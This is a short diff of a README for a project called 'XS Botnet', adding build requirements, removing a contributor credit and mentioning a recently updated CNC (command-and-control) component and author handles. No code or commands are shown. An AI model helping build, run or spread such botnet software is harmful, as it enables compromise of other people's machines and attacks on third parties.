@@ -3,8 +3,9 @@
 # Changelog:
 - Read Changelog.md for changelog
 - CNC Just updated at 24 may 2025
-## Thx to ppl doing Pull requests:
-- oxyjdv
+## Requirements:
+- Ubuntu 22.04 or later
+- x86_64 gcc
 ## XS Botnet
 - made by: daylight911 (discord), FuckIsra3l(telegram)
 - Made in github codespaces(Make & C ext, Copilot).
